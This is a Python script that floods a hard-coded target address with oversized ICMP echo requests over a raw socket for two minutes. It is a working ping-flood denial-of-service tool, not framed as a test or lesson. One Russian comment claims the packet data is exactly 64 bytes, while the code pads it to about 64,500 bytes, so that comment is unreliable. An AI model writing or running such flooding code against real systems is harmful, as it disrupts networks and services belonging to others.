import socket
import struct
import sys
import time
import logging

def icmp_flood(target_ip, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    timeout = time.time() + duration

    while time.time() < timeout:
        packet = create_icmp_packet()
        sock.sendto(packet, (target_ip, 0))
        logging.info(f"ICMP request sent to {target_ip}")

def create_icmp_packet():
    # Установим длину данных в точно 64 байта
    data = b'ABCDEFGHIJKLMNOPQRSTUVWX' + b'\x00' * 64500
    header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
    cksum = calculate_checksum(header + data)
    header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
    return header + data

def calculate_checksum(data):
    checksum = 0
    count_to = (len(data) // 2) * 2

    for count in range(0, count_to, 2):
        thisVal = data[count + 1] * 256 + data[count]
        checksum = checksum + thisVal
        checksum = checksum & 0xffffffff

    if count_to < len(data):
        checksum = checksum + data[count_to]
        checksum = checksum & 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    checksum = ~checksum
    checksum = checksum & 0xffff
    checksum = checksum >> 8 | (checksum << 8 & 0xff00)

    return checksum

if __name__ == '__main__':
    target_ip = '192.168.1.1'
    duration = 120
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    icmp_flood(target_ip, duration)